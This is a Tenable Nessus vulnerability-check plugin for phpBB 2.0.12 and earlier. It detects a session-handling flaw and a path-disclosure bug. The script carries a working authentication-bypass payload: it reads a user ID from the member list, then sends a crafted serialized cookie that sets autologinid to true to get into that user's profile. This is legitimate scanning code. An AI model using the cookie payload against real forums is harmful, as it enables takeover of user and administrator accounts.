#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(17225);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2005-0603", "CVE-2005-0614"); 
  script_bugtraq_id(12678);
  script_osvdb_id(14242, 14243);

  script_name(english:"phpBB <= 2.0.12 Multiple Vulnerabilities");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of phpBB that suffers from a
session handling flaw allowing a remote attacker to gain access to any
account, including that of an administrator. 

Also, there is a path disclosure bug in 'viewtopic.php' that can be
exploited by a remote attacker to reveal sensitive information about
the installation that can be used in further attacks." );
 script_set_attribute(attribute:"see_also", value:"http://www.phpbb.com/phpBB/viewtopic.php?f=14&t=267563" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to phpBB 2.0.13 or newer." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/02/28");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/02/26");
 script_cvs_date("$Date: 2016/05/16 14:22:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:phpbb_group:phpbb");
script_end_attributes();

  script_summary(english:"Checks for multiple vulnerabilities in phpBB version <= 2.0.12");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_dependencies("phpbb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpBB");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

# Test an install.
install = get_kb_item(string("www/", port, "/phpBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  init_cookiejar();

  # To exploit the first vulnerability, we'll get the memberlist which
  # gives us a userid to exploit.
  r = http_send_recv3(method: "GET", item:dir + "/memberlist.php", port:port);
  if (isnull(r)) exit(0);

  pat = 'href="profile.php.mode=viewprofile&amp;u=([0-9]+)&amp;sid=';
  matches = egrep(pattern:pat, string:r[2]);
  if (matches) {
    foreach match (split(matches)) {
      match = eregmatch(pattern:pat, string:match);
      if (!isnull(match)) {
        user = match[1];
        # just grab the first user.
        break;
      }
    }
  }

  # Use the cookie and userid to try an exploit.
  if (!isnull(user)) {
    # nb: autologonid is supposed to be the hex-encoded password of the user
    #     represented as a string; thus, we can exploit the vulnerability 
    #     simply by passing in the boolean (iff the password is set).
    set_http_cookie(name: "phpbb2mysql_data", value: strcat("a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bi%3A", user, "%3B%7D"));
    r = http_send_recv3(method: "GET", item: dir+"/profile.php?mode=editprofile", port: port, follow_redirect: 0);
    if (isnull(r)) exit(0);

    # Cookies will be set regardless, but a non-vulnerable 
    # version returns a redirect.
    if (
      egrep(pattern:"^Set-Cookie: phpbb2mysql", string: r[1]) && 
      !egrep(pattern:"^Location: http", string: r[1])
    ) {
      security_hole(port);
    }
  }
}
